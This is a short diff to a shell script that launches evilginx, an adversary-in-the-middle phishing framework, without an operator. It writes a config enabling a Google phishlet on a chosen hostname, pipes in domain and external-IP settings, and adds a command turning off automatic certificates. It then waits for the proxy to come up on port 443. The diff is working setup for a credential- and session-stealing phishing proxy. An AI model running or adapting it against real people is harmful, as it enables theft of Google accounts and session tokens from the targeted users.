@@ -31,7 +31,7 @@ echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unaut
 
 echo "--- starting evilginx (headless via fifo) ---"
 rm -f /tmp/eg_in; mkfifo /tmp/eg_in
-( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
+( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
 "$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &
 
 echo "--- waiting for :443 (up to 60s) ---"
